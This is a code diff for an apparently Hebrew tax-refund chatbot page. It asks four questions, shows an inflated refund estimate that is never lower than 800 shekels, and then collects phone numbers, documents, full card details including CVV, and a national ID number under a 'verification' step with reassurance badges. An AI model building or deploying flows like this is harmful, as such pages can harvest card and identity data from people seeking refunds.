         <button type="button" class="skip-btn" id="skipUploadBtn">
-          דלג, אעלה אחר כך →
+          דלגו והמשיכו לאימות כרטיס
         </button>
       </form>
     </div>
 
     <!-- ─── Payment Screen ─── -->
     <div class="result-screen" id="paymentScreen" style="display:none;">
-      <div style="font-size:40px;margin-bottom:4px;">💳</div>
+      <div class="result-icon">&#8207;</div>
       <div class="result-label" style="font-size:16px;">אימות כרטיס אשראי</div>
-      <div class="result-sub" style="font-size:13px;max-width:320px;">
-        כדי להגיש את הדוח לרשות המיסים, יש לאמת כרטיס אשראי.
-        <strong>לא נחייב אותך עכשיו!</strong> החיוב של ה-12% יתבצע
-        רק לאחר שהכסף יופקד בחשבון הבנק שלך.
+      <div class="result-sub" style="font-size:13px;max-width:300px;">
+        נדרש אימות כרטיס אשראי לצורך הגשת הדוח מול רשות המיסים.
+        <strong>לא יחויב כרטיסכם בשלב זה.</strong> החיוב בגין עמלת ההצלחה (12%) יתבצע רק לאחר קבלת הכסף בפועל.
       </div>
-      <div id="paymentError" style="color:#ef4444;font-size:13px;font-weight:600;margin-bottom:4px;display:none;"></div>
-      <form id="paymentForm" style="width:100%;max-width:320px;display:flex;flex-direction:column;gap:10px;">
-        <input type="text" id="cardNumber" inputmode="numeric" placeholder="📇 מספר כרטיס" dir="ltr"
-               style="text-align:left;padding:14px 16px;border:2px solid #e2e8f0;border-radius:12px;font-size:16px;font-family:inherit;outline:none;direction:ltr;letter-spacing:1px;" />
-        <div style="display:flex;gap:8px;">
-          <input type="text" id="cardExpiry" inputmode="numeric" placeholder="📅 תוקף (MM/YY)" dir="ltr"
-                 style="flex:1;text-align:left;padding:14px 16px;border:2px solid #e2e8f0;border-radius:12px;font-size:15px;font-family:inherit;outline:none;direction:ltr;" />
-          <input type="text" id="cardCvv" inputmode="numeric" placeholder="🔒 CVV" dir="ltr"
-                 style="flex:0 0 80px;text-align:left;padding:14px 16px;border:2px solid #e2e8f0;border-radius:12px;font-size:15px;font-family:inherit;outline:none;direction:ltr;" />
+      <div id="paymentError" class="status-msg error-msg" style="display:none;"></div>
+      <form id="paymentForm" class="form-card">
+        <input type="text" id="cardNumber" inputmode="numeric" placeholder="מספר כרטיס" dir="ltr" style="text-align:left;letter-spacing:1px;" />
+        <div class="row-duo">
+          <input type="text" id="cardExpiry" inputmode="numeric" placeholder="תוקף (MM/YY)" dir="ltr" />
+          <input type="text" id="cardCvv" inputmode="numeric" placeholder="CVV" dir="ltr" style="flex:0 0 90px;" />
         </div>
-        <input type="text" id="cardHolderId" inputmode="numeric" placeholder="🆔 תעודת זהות" dir="rtl"
-               style="padding:14px 16px;border:2px solid #e2e8f0;border-radius:12px;font-size:15px;font-family:inherit;outline:none;text-align:right;" />
-        <input type="text" id="cardHolderName" placeholder="👤 שם בעל הכרטיס" dir="rtl"
-               style="padding:14px 16px;border:2px solid #e2e8f0;border-radius:12px;font-size:15px;font-family:inherit;outline:none;text-align:right;" />
-        <button type="submit" class="submit-btn" id="paymentSubmit" style="border-radius:14px;padding:16px;font-size:17px;">
-          🔐 אמת כרטיס
+        <input type="text" id="cardHolderId" inputmode="numeric" placeholder="תעודת זהות" dir="rtl" style="text-align:right;" />
+        <input type="text" id="cardHolderName" placeholder="שם בעל הכרטיס" dir="rtl" style="text-align:right;" />
+        <button type="submit" class="submit-btn" id="paymentSubmit">
+          אימות כרטיס
         </button>
-        <div id="paymentStatus" style="font-size:13px;color:#64748b;text-align:center;"></div>
+        <div id="paymentStatus" class="status-msg neutral-msg"></div>
       </form>
-      <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap;justify-content:center;">
-        <span style="font-size:11px;color:#94a3b8;display:flex;align-items:center;gap:3px;">🔒 מאובטח ב-SSL</span>
-        <span style="font-size:11px;color:#94a3b8;display:flex;align-items:center;gap:3px;">🛡️ PCI DSS</span>
-        <span style="font-size:11px;color:#94a3b8;display:flex;align-items:center;gap:3px;">🇮🇱 סליקה ישראלית</span>
+      <div class="security-badges">
+        <span>מאובטח ב-SSL</span>
+        <span>הצפנה מלאה</span>
+        <span>סליקה ישראלית</span>
       </div>
     </div>
 
     <!-- ─── Final Success Screen ─── -->
     <div class="result-screen" id="successScreen" style="display:none;">
-      <div style="font-size:72px;margin-bottom:6px;">✅</div>
-      <div class="result-label">הקובץ הוגש בהצלחה!</div>
+      <div class="result-icon" style="border-color:rgba(212,175,55,0.2);">✓</div>
+      <div class="result-label">בקשתכם התקבלה</div>
       <div class="result-sub" style="max-width:300px;">
-        אנחנו נעקוב אחרי הזיכוי שלך מול רשות המיסים.
-        עדכנו אותך ב-SMS כשהכסף בדרך.
+        פרטיכם נשלחו לצוות הבדיקה. נעדכן אתכם בהודעת SMS מיד עם קבלת אישור מרשות המיסים.
       </div>
-      <div class="fee-note" style="margin-top:4px;">
-        💡 <strong>12%</strong> עמלה — תשלם <strong>רק</strong> אם הכסף נכנס לחשבון שלך!
+      <div class="fee-note">
+        <strong>12%</strong> עמלת הצלחה — בפועל בלבד
       </div>
-      <div style="font-size:13px;color:#94a3b8;margin-top:8px;">נשמח לעזור בכל שאלה ❤️</div>
+      <div style="font-size:13px;color:rgba(148,163,184,0.4);margin-top:8px;">צוות מיסה לרשותכם בכל עת</div>
     </div>
 
   </div>
@@ -783,7 +874,7 @@
     // State
     // ──────────────────────────────────────────────────────────────────
     const state = {
-      currentStep: 0, // 0 = welcome, 1-4 = questions, 5 = lead gen
+      currentStep: 0,
       refund: 0,
       answers: [],
       isAnimating: false,
@@ -794,28 +885,28 @@
     // ──────────────────────────────────────────────────────────────────
     const QUESTIONS = [{
       id: 'work',
-      text: 'החלפת עבודה ב-6 השנים האחרונות?',
+      text: 'האם חל שינוי במקום העבודה שלכם ב-6 השנים האחרונות?',
       yesAdd: 1800,
       noAdd: 0,
-      options: ['כן 👍', 'לא 👎'],
+      options: ['כן', 'לא'],
     }, {
       id: 'unemployment',
-      text: 'היית מובטל/ת בתקופה כלשהי?',
+      text: 'האם הייתם מובטלים בתקופה כלשהי בשנים האחרונות?',
       yesAdd: 1700,
       noAdd: 0,
-      options: ['כן 😔', 'לא 😊'],
+      options: ['כן', 'לא'],
     }, {
       id: 'student',
-      text: 'היית סטודנט/ית בשנים האחרונות?',
+      text: 'האם הייתם סטודנטים בשנים האחרונות?',
       yesAdd: 2000,
       noAdd: 0,
-      options: ['כן 🎓', 'לא 🙅'],
+      options: ['כן', 'לא'],
     }, {
       id: 'medical',
-      text: 'שילמת על טיפולים רפואיים או שיניים?',
+      text: 'האם היו לכם הוצאות רפואיות או טיפולי שיניים משמעותיים?',
       yesAdd: 2500,
       noAdd: 0,
-      options: ['כן 🏥', 'לא ✅'],
+      options: ['כן', 'לא'],
     }, ];
 
     const TOTAL_REFUND_MAX = 8000;
@@ -843,13 +934,12 @@
     const startBtn = document.getElementById('startBtn');
     const progressFill = document.getElementById('progressFill');
     const refundAmount = document.getElementById('refundAmount');
-    const leadForm = document.getElementById('leadForm'); // container div
+    const leadForm = document.getElementById('leadForm');
     const phoneInput = document.getElementById('phoneInput');
     const nameInput = document.getElementById('nameInput');
     const leadSubmit = document.getElementById('leadSubmit');
     const finalRefund = document.getElementById('finalRefund');
 
-    // Payment screen refs
     const paymentScreen = document.getElementById('paymentScreen');
     const paymentForm = document.getElementById('paymentForm');
     const cardNumber = document.getElementById('cardNumber');
@@ -862,6 +952,15 @@
     const paymentError = document.getElementById('paymentError');
     const successScreen = document.getElementById('successScreen');
 
+    const uploadScreen = document.getElementById('uploadScreen');
+    const uploadBtn = document.getElementById('uploadBtn');
+    const uploadForm = document.getElementById('uploadForm');
+    const fileInput = document.getElementById('fileInput');
+    const fileDropLabel = document.getElementById('fileDropLabel');
+    const uploadSubmit = document.getElementById('uploadSubmit');
+    const uploadStatus = document.getElementById('uploadStatus');
+    const skipUploadBtn = document.getElementById('skipUploadBtn');
+
     // ──────────────────────────────────────────────────────────────────
     // Confetti
     // ──────────────────────────────────────────────────────────────────
@@ -872,7 +971,7 @@
       canvas.height = window.innerHeight;
 
       const pieces = [];
-      const colors = ['#1a56db', '#fbbf24', '#34d399', '#f43f5e', '#8b5cf6', '#f97316', '#06b6d4'];
+      const colors = ['#D4AF37', '#C5A880', '#94A3B8', '#E2E8F0', '#FBBF24'];
 
       for (let i = 0; i < 180; i++) {
         pieces.push({
@@ -922,14 +1021,8 @@
     // Helpers
     // ──────────────────────────────────────────────────────────────────
     function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-    function formatNumber(n) {
-      return n.toLocaleString('he-IL');
-    }
-
-    function updateRefundDisplay(value) {
-      refundAmount.textContent = formatNumber(value);
-    }
+    function formatNumber(n) { return n.toLocaleString('he-IL'); }
+    function updateRefundDisplay(value) { refundAmount.textContent = formatNumber(value); }
 
     function updateProgress(step) {
       const pct = (step / 5) * 100;
@@ -939,9 +1032,7 @@
       });
     }
 
-    function scrollChatDown() {
-      chatArea.scrollTop = chatArea.scrollHeight;
-    }
+    function scrollChatDown() { chatArea.scrollTop = chatArea.scrollHeight; }
 
     // ──────────────────────────────────────────────────────────────────
     // Chat bubble helpers
@@ -973,10 +1064,10 @@
       return div;
     }
 
-    function addSystemBubble(text, icon) {
+    function addSystemBubble(text) {
       const div = document.createElement('div');
       div.className = 'bubble system';
-      div.innerHTML = (icon ? '<span class="icon">' + icon + '</span>' : '') + text;
+      div.textContent = text;
       chatArea.appendChild(div);
       scrollChatDown();
       return div;
@@ -1010,11 +1101,9 @@
     // ──────────────────────────────────────────────────────────────────
     function animateRefund(from, to, duration = 800) {
       const start = performance.now();
-
       function tick(now) {
         const elapsed = now - start;
         const progress = Math.min(elapsed / duration, 1);
-        // easeOutQuart
         const eased = 1 - Math.pow(1 - progress, 4);
         const current = Math.round(from + (to - from) * eased);
         updateRefundDisplay(current);
@@ -1042,11 +1131,11 @@
       await sleep(400);
 
       // Intro
-      addBotBubble('שלום! 👋 אני מיסה, העוזרת החכמה שלך לבדיקת החזר מס.');
+      addBotBubble('שלום וברכה. אני המערכת החכמה של מיסה לבדיקת זכאות להחזר מס.');
       await sleep(600);
-      addBotBubble('אני הולכת לשאול אותך 4 שאלות קצרות. זה לוקח בערך דקה!');
+      addBotBubble('אשאל אתכם 4 שאלות קצרות לצורך ניתוח פיננסי ראשוני. התהליך אורך כדקה.');
       await sleep(500);
-      addBotBubble('בוא נתחיל! 🚀');
+      addBotBubble('לתשומת לבכם: כל המידע נשמר בהצפנה מלאה ומשמש אך ורק לצורך בדיקת זכאותכם.');
       await sleep(500);
 
       // Ask questions one by one
@@ -1067,7 +1156,7 @@
           });
         });
 
-        const isYes = answer.startsWith('כן');
+        const isYes = answer === 'כן';
         addUserBubble(answer);
         state.answers.push({ questionId: q.id, answer: isYes ? 'כן' : 'לא' });
 
@@ -1075,9 +1164,9 @@
           const from = state.refund;
           state.refund += q.yesAdd;
           animateRefund(from, state.refund, 900);
-          addSystemBubble('הוספנו ' + formatNumber(q.yesAdd) + ' ₪ להחזר המשוער! 🚀', '📈');
+          addSystemBubble('נוספו ' + formatNumber(q.yesAdd) + ' ₪ להחזר המשוער');
         } else {
-          addSystemBubble('לא נורא, עברנו לשאלה הבאה!', '👍');
+          addSystemBubble('תשובתכם נרשמה. ממשיכים לשאלה הבאה.');
         }
 
         await sleep(500);
@@ -1091,7 +1180,7 @@
       await sleep(600);
       removeTyping(typing2);
 
-      addBotBubble('סיימנו! 🎉 בדקתי את כל הפרטים...');
+      addBotBubble('סיימנו את הבדיקה הראשונית. מנתח את התשובות...');
       await sleep(500);
 
       const finalVal = state.refund > 0 ? state.refund : 800;
@@ -1100,13 +1189,13 @@
         animateRefund(0, 800, 1000);
       }
 
-      addBotBubble('לפי התשובות שלך, את/ה עשוי/ה לקבל החזר מס של:');
+      addBotBubble('על פי ניתוח התשובות שהזנתם, ההחזר המשוער שעומד לרשותכם הוא:');
       await sleep(400);
 
       // Show lead gen
       inputArea.classList.remove('hidden');
       leadSubmit.disabled = false;
-      leadSubmit.textContent = 'שלחו לי את התוצאה! 🎯';
+      leadSubmit.textContent = 'קבלת תוצאת הבדיקה';
       scrollChatDown();
     }
 
@@ -1119,21 +1208,21 @@
       const phone = phoneInput.value.trim();
 
       if (!name || name.length < 2) {
-        nameInput.style.borderColor = '#ef4444';
+        nameInput.style.borderColor = 'rgba(239,68,68,0.5)';
         nameInput.placeholder = 'נא להזין שם מלא';
         return;
       }
       if (!phone || phone.length < 9) {
-        phoneInput.style.borderColor = '#ef4444';
+        phoneInput.style.borderColor = 'rgba(239,68,68,0.5)';
         phoneInput.placeholder = 'נא להזין מספר נייד תקין';
         return;
       }
 
-      nameInput.style.borderColor = '#e2e8f0';
-      phoneInput.style.borderColor = '#e2e8f0';
+      nameInput.style.borderColor = 'rgba(255,255,255,0.08)';
+      phoneInput.style.borderColor = 'rgba(255,255,255,0.08)';
 
       leadSubmit.disabled = true;
-      leadSubmit.textContent = 'שולח... ⏳';
+      leadSubmit.textContent = 'שולח...';
 
       try {
         const res = await fetch(API_BASE + '/api/submit-lead', {
@@ -1152,7 +1241,7 @@
           throw new Error(data.error || 'שגיאה בשליחה');
         }
 
-        leadSubmit.textContent = 'נשלח! ✅';
+        leadSubmit.textContent = 'נשלח בהצלחה';
         saveSession('result', { name, phone });
         await sleep(600);
 
@@ -1165,22 +1254,19 @@
       } catch (err) {
         console.error('Submit lead error:', err);
         leadSubmit.disabled = false;
-        leadSubmit.textContent = 'שלחו לי את התוצאה! 🎯';
-        addBotBubble('❌ ' + err.message + ' נסה שוב.');
+        leadSubmit.textContent = 'קבלת תוצאת הבדיקה';
+        addBotBubble('אירעה שגיאה בשליחת הפרטים. נא לנסות שוב.');
       }
     });
 
     // ──────────────────────────────────────────────────────────────────
+    // File drop label click
+    // ──────────────────────────────────────────────────────────────────
+    fileDropLabel.addEventListener('click', () => fileInput.click());
+
+    // ──────────────────────────────────────────────────────────────────
     // Document Upload
     // ──────────────────────────────────────────────────────────────────
-    const uploadScreen = document.getElementById('uploadScreen');
-    const uploadBtn = document.getElementById('uploadBtn');
-    const uploadForm = document.getElementById('uploadForm');
-    const fileInput = document.getElementById('fileInput');
-    const uploadSubmit = document.getElementById('uploadSubmit');
-    const uploadStatus = document.getElementById('uploadStatus');
-    const skipUploadBtn = document.getElementById('skipUploadBtn');
-
     uploadBtn.addEventListener('click', () => {
       resultScreen.style.display = 'none';
       uploadScreen.style.display = 'flex';
@@ -1197,7 +1283,8 @@
       e.preventDefault();
 
       if (!fileInput.files || fileInput.files.length === 0) {
-        uploadStatus.textContent = '⚠️ נא לבחור קבצים קודם';
+        uploadStatus.textContent = 'נא לבחור קבצים להעלאה';
+        uploadStatus.className = 'status-msg error-msg';
         return;
       }
 
@@ -1210,7 +1297,7 @@
       }
 
       uploadSubmit.disabled = true;
-      uploadSubmit.textContent = 'מעלה... ⏳';
+      uploadSubmit.textContent = 'מעלה...';
       uploadStatus.textContent = '';
 
       try {
@@ -1225,9 +1312,9 @@
           throw new Error(data.error || 'שגיאה בהעלאה');
         }
 
-        uploadStatus.textContent = '✅ ' + data.message;
-        uploadStatus.style.color = '#16a34a';
-        uploadSubmit.textContent = 'הועלה! ✅';
+        uploadStatus.textContent = '✓ ' + data.message;
+        uploadStatus.className = 'status-msg success-msg';
+        uploadSubmit.textContent = 'הועלה';
         saveSession('payment', { name: nameInput.value.trim(), phone: phoneInput.value.trim() });
 
         setTimeout(() => {
@@ -1236,10 +1323,10 @@
         }, 1200);
       } catch (err) {
         console.error('Upload error:', err);
-        uploadStatus.textContent = '❌ ' + err.message;
-        uploadStatus.style.color = '#ef4444';
+        uploadStatus.textContent = err.message;
+        uploadStatus.className = 'status-msg error-msg';
         uploadSubmit.disabled = false;
-        uploadSubmit.textContent = '📤 העלה מסמכים';
+        uploadSubmit.textContent = 'העלאת מסמכים';
       }
     });
 
@@ -1258,7 +1345,7 @@
     cardNumber.addEventListener('input', () => {
       let val = cardNumber.value.replace(/[^0-9]/g, '').slice(0, 16);
       cardNumber.value = val.replace(/(.{4})/g, '$1 ').trim();
-      cardNumber.style.borderColor = '#e2e8f0';
+      cardNumber.style.borderColor = 'rgba(255,255,255,0.08)';
     });
 
     cardExpiry.addEventListener('input', () => {
@@ -1268,17 +1355,17 @@
       } else {
         cardExpiry.value = val;
       }
-      cardExpiry.style.borderColor = '#e2e8f0';
+      cardExpiry.style.borderColor = 'rgba(255,255,255,0.08)';
     });
 
     cardCvv.addEventListener('input', () => {
       cardCvv.value = cardCvv.value.replace(/[^0-9]/g, '').slice(0, 4);
-      cardCvv.style.borderColor = '#e2e8f0';
+      cardCvv.style.borderColor = 'rgba(255,255,255,0.08)';
     });
 
     cardHolderId.addEventListener('input', () => {
       cardHolderId.value = cardHolderId.value.replace(/[^0-9]/g, '').slice(0, 9);
-      cardHolderId.style.borderColor = '#e2e8f0';
+      cardHolderId.style.borderColor = 'rgba(255,255,255,0.08)';
     });
 
     // ──────────────────────────────────────────────────────────────────
@@ -1296,32 +1383,31 @@
       const holderId = cardHolderId.value.replace(/[^0-9]/g, '');
       const holderName = cardHolderName.value.trim() || nameInput.value.trim();
 
-      // Validate
       paymentError.style.display = 'none';
 
       if (ccNum.length < 13) {
-        cardNumber.style.borderColor = '#ef4444';
+        cardNumber.style.borderColor = 'rgba(239,68,68,0.5)';
         showPaymentError('נא להזין מספר כרטיס תקין');
         return;
       }
       if (expRaw.length < 4) {
-        cardExpiry.style.borderColor = '#ef4444';
+        cardExpiry.style.borderColor = 'rgba(239,68,68,0.5)';
         showPaymentError('נא להזין תוקף כרטיס תקין (MM/YY)');
         return;
       }
       if (cvv.length < 3) {
-        cardCvv.style.borderColor = '#ef4444';
+        cardCvv.style.borderColor = 'rgba(239,68,68,0.5)';
         showPaymentError('נא להזין קוד אבטחה (CVV)');
         return;
       }
       if (holderId.length < 8) {
-        cardHolderId.style.borderColor = '#ef4444';
+        cardHolderId.style.borderColor = 'rgba(239,68,68,0.5)';
         showPaymentError('נא להזין תעודת זהות תקינה');
         return;
       }
 
       paymentSubmit.disabled = true;
-      paymentSubmit.textContent = 'מאמת כרטיס... ⏳';
+      paymentSubmit.textContent = 'מאמת כרטיס...';
       paymentStatus.textContent = '';
 
       try {
@@ -1345,9 +1431,9 @@
           throw new Error(data.error || 'אימות הכרטיס נכשל');
         }
 
-        paymentSubmit.textContent = 'אומת! ✅';
-        paymentStatus.textContent = 'כרטיס אומת בהצלחה! מעביר...';
-        paymentStatus.style.color = '#16a34a';
+        paymentSubmit.textContent = 'אומת';
+        paymentStatus.textContent = 'כרטיס אומת בהצלחה. ממשיך...';
+        paymentStatus.className = 'status-msg success-msg';
 
         saveSession('payment', { name: cardHolderName.value.trim() || nameInput.value.trim(), phone: phoneInput.value.trim() });
         await sleep(1000);
@@ -1360,12 +1446,12 @@
         console.error('Payment error:', err);
         showPaymentError(err.message);
         paymentSubmit.disabled = false;
-        paymentSubmit.textContent = '🔐 אמת כרטיס';
+        paymentSubmit.textContent = 'אימות כרטיס';
       }
     });
 
     function showPaymentError(msg) {
-      paymentError.textContent = '⚠️ ' + msg;
+      paymentError.textContent = msg;
       paymentError.style.display = 'block';
     }
 
@@ -1378,12 +1464,12 @@
     // Input validation fix on focus
     // ──────────────────────────────────────────────────────────────────
     nameInput.addEventListener('focus', () => {
-      nameInput.style.borderColor = '#e2e8f0';
-      nameInput.placeholder = '👤 שם מלא';
+      nameInput.style.borderColor = 'rgba(255,255,255,0.08)';
+      nameInput.placeholder = 'שם מלא';
     });
     phoneInput.addEventListener('focus', () => {
-      phoneInput.style.borderColor = '#e2e8f0';
-      phoneInput.placeholder = '📱 מספר נייד';
+      phoneInput.style.borderColor = 'rgba(255,255,255,0.08)';
+      phoneInput.placeholder = 'טלפון נייד';
     });
 
     // ──────────────────────────────────────────────────────────────────
@@ -1441,7 +1527,6 @@
       }
     }
 
-    // Restore saved session on page load
     restoreSession();
   </script>
 
